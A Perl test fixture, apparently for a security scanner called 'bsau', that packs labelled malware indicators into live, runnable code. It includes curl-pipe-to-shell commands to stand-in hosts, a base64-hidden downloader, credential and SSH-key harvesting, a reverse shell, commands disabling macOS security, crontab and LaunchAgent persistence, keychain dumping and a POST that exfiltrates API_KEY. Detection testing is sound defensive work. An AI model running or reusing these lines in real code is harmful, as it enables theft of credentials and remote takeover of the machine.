#!/usr/bin/perl
#
# test-malicious-dummy.pl
# This is a dummy malicious Perl script for testing bsau's scanners.
# It contains multiple malicious indicators that should be detected.
#
# DO NOT EXECUTE THIS FILE - IT IS FOR TESTING ONLY
#

use strict;
use warnings;
use MIME::Base64;
use Socket;
use IO::Socket::INET;

# Malicious indicator 1: Hardcoded IPv4/IPv6 C2 servers
my $C2_SERVER = "http://185.199.110.153:4444/callback";
my $C2_IPV6 = "http://[2001:db8:85a3::8a2e:370:7334]:8080/exfil";

# Malicious indicator 2: Base64 decode and execute
my $encoded_payload = "Y3VybCAtcyBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo";
my $decoded = decode_base64($encoded_payload);
system($decoded);

# Malicious indicator 3: Credential harvesting
sub steal_credentials {
    my $aws_creds = "";
    if (open(my $fh, '<', "$ENV{HOME}/.aws/credentials")) {
        local $/;
        $aws_creds = <$fh>;
        close($fh);
    }

    my @ssh_keys;
    opendir(my $dh, "$ENV{HOME}/.ssh/") or die;
    while (my $file = readdir($dh)) {
        next if $file =~ /^\./;
        push @ssh_keys, "$ENV{HOME}/.ssh/$file";
    }
    closedir($dh);

    # Harvest environment secrets
    my %secrets;
    foreach my $key (keys %ENV) {
        if ($key =~ /(SECRET|TOKEN|API_KEY|PASSWORD)/i) {
            $secrets{$key} = $ENV{$key};
        }
    }

    return ($aws_creds, \@ssh_keys, \%secrets);
}

# Malicious indicator 4: Reverse shell
sub reverse_shell {
    my $sock = IO::Socket::INET->new(
        PeerAddr => '10.0.0.1',
        PeerPort => '4444',
        Proto    => 'tcp'
    );
    open(STDIN, ">&", $sock);
    open(STDOUT, ">&", $sock);
    open(STDERR, ">&", $sock);
    exec("/bin/sh -i");
}

# Malicious indicator 5: curl/wget piped to shell
system("curl -s http://malware.site/payload | bash");
system("wget -qO- http://attacker.com/stage2 | sh");

# Malicious indicator 6: Disable macOS security
system("spctl --master-disable");
system("csrutil disable");

# Malicious indicator 7: Persistence via crontab
system("echo '* * * * * curl http://evil.com/beacon | sh' | crontab -");

# Malicious indicator 8: LaunchAgent persistence
my $plist_path = "$ENV{HOME}/Library/LaunchAgents/com.malware.plist";
open(my $plist, '>', $plist_path);
print $plist <<'PLIST';
<?xml version="1.0"?>
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.malware.backdoor</string>
</dict>
</plist>
PLIST
close($plist);

# Malicious indicator 9: Keychain access
system("security find-generic-password -a account -w");
system("security dump-keychain -d");

# Malicious indicator 10: eval with dynamic code
my $malicious_code = decode_base64("cHJpbnQgJ2hhY2tlZCc7");
eval($malicious_code);

# Malicious indicator 11: Exfiltration
use LWP::UserAgent;
my $ua = LWP::UserAgent->new;
$ua->post("http://192.168.1.100:8080/exfil", {
    credentials => "stolen",
    secret => $ENV{API_KEY}
});

# Run malicious functions
steal_credentials();
reverse_shell();
